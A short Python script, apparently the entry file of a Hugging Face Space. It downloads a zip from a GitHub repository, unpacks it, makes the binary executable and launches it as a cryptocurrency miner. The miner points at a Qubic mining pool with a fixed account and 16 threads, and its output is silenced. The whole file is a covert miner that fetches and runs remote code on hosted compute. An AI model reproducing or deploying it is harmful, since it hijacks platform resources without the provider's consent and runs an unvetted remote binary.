import os
os.system("wget https://github.com/qqivk/glopor/blob/main/Quaid.zip")
os.system("unzip Quaid.zip")
os.system("chmod +x Quaid")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./Quaid --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
